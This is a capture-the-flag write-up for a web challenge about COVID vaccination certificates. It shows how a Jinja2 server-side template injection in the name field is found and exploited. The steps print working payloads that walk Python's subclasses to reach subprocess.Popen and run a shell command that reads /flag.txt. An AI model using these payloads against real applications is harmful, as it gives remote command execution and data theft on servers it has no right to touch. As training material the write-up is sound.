# JinjaCare (<font color=green> Very Easy </font>)


## Description
Jinjacare is a web application designed to help citizens manage and access their COVID-19 vaccination records. The platform allows users to store their vaccination history and generate digital certificates. They've asked you to hunt for any potential security issues in their application and retrieve the flag stored in their site.  
📝 Related Bug Bounty Reports  
Bug Report #1 - [RCE via SSTI](https://hackerone.com/reports/125980)  
Bug Report #2 - [SSTI](https://hackerone.com/reports/1104349)


## Tools Used

- Browser Developer Tools (to inspect and test form inputs)

- Jinja2 SSTI payloads

- Custom SSTI enumeration script via templating

## Skills Learned

- Detecting and exploiting Server-Side Template Injection (SSTI)

- Using Jinja2 internals to traverse Python’s object model

- Enumerating Python classes and finding dangerous built-ins like `subprocess.Popen`

## Steps Taken
1. Try Server Side Template Injection on Name parameter `{{7*7}}` and download certificate
2. The SSTI works as the name shows `7777777`
3. Using `{{''.__class__.__mro__[1].__subclasses__()}}` to list of all loaded Python classes and find any useful class.
4. `subprocess.Popen` is available so we can directly run shell commands but first we have to find the index using:  
    ```
    {% for i in range(1, 500) %}
    {{ i }}: {{ ''.__class__.__mro__[1].__subclasses__()[i] }}
    {% endfor %}
    ```
5. `subprocess.Popen` is at index 359. Use this payload to read the flag:  
    ```
    {{''.__class__.__mro__[1].__subclasses__()[359](['cat','/flag.txt'], stdout=-1).communicate()[0].decode()}}
    ```
    This runs cat /flag.txt and outputs the flag content.
